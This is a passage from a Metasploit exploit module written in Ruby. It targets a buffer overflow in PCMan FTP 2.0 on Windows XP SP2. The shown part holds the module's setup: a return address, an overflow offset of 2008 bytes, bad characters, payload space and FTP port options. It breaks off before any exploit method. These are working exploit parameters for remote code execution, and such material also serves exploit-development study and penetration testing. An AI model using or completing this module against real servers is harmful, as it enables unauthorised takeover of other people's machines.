class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::Remote::Ftp
    def initialize(info = {})
        super(update_info(info, 
            'Name' => "PCMan FTP BoF",
            'Description' => 'PCMAN FTP 2.0 buffer overflow simple version',
            'Author' => 'DAVID',
            'DefaultOptions' => {
                'EXITFUNC' => 'process',
                'VERBOSE' => 'true'
            },
            'Payload' => {
                'Space' => 1000,
                'BadChars' => '\x00\xff\x0a\x0d\x20\x40',
            },
            'Platform' => 'win',
            'Targets' => [
                ['Windows XP SP2 English', {
                    'Ret' => 0x71ab9372, # ESP address for shellcode placement
                    'Offset' => 2008
                }],
            ],
            'DefaultTarget' => 0
        ))
        register_options([
            Opt::RPORT(21),
            OptString.new('FTPPASS', [true, 'FTP PASSWORD', 'anonymous']) # global, name, default
        ])
    end